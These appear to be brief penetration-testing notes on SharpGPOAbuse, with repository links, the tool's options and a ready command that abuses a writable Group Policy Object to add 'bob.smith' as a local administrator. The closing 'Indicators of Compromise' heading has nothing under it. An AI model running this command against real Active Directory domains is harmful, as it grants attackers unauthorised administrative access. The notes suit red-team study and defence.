https://github.com/FSecureLABS/SharpGPOAbuse

https://github.com/byronkg/SharpGPOAbuse
https://github.com/byronkg/SharpGPOAbuse/releases/tag/1.0

In my Kali within binaries

https://bit-bandits.com/sharpgpoabuse.html

The following are the available options to add a local admin via GPO:
```
Options required to add a new local admin:
--UserAccount
        Set the name of the account to be added in local admins.
--GPOName
        The name of the vulnerable GPO.
```

The following will create a new local administrator account named "bob.smith":
```
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount bob.smith --GPOName "Vulnerable GPO"
```
Indicators of Compromise